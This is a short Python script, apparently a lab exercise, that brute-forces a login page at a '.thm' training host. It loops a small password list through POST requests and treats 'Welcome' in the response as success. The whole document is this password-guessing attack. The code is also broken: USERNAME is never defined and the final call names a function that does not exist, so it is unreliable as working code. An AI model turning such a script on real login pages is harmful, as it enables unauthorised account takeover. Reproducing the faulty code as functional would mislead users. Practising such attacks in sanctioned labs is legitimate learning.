import requests

def brute_force_login(LOGIN_URL):
    """Brute forces the login panel."""
    session = requests.Session()

    wordlist = ["password", "admin123", "letmein", "qwerty", "12345"]

    for password in wordlist:
        print(f"[*] Trying password: {password}")
        data = {"username": USERNAME, "password": password}
        response = session.post(LOGIN_URL, data=data)

        if "Welcome" in response.text:
            print(f"[+] Login successful! Username: {USERNAME}, Password: {password}")
            return session

    print("[-] Brute force failed.")
    return None
# Create a session object

# Log in and maintain the session automatically
login_url = "http://python.thm/labs/lab4/login.php"

session = bruteforce(login_url)
